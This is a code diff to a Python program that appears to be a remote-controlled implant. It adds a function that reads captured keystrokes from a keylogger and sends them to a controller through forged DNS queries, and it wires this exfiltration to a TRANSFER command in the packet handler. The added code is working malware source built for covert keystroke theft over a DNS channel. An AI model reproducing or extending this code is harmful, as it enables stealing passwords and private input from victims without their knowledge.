@@ -291,6 +291,19 @@ def start_keylogger():
         query = forge_dns_query_stream("FAILED: You can't start an active keylogger", GENERAL_MSG_IDENTIFICATION)
         send_dns_query(query)
 
+def transfer_keylogger():
+    data = KEYLOGGER_INSTANCE.get_keylog()
+    if not data:
+        print("FAILED: Keylogger has not captured any data.")
+        query = forge_dns_query_stream("FAILED: Keylogger has not captured any data.", GENERAL_MSG_IDENTIFICATION)
+        send_dns_query(query)
+    else:
+        print("SUCCESS: Transferring keylog data...")
+        # Send notification
+        query = forge_dns_query_stream("SUCCESS: Transferring keylog data...", GENERAL_MSG_IDENTIFICATION)
+        send_dns_query(query)
+        # Send keylog data
+        forge_dns_query_block(data, KEYLOG_IDENTIFICATION)
 
 def packet_handler(pkt):
     """
@@ -311,9 +324,7 @@ def packet_handler(pkt):
             if argv[1] == START:
                 start_keylogger()
             if argv[1] == TRANSFER:
-                # 1. Get the keylog data.
-                # 2. Transfer it to the controller.
-                print("transfer keylogger")
+                transfer_keylogger()
 
 
 MONITOR = FileSystemMonitor()
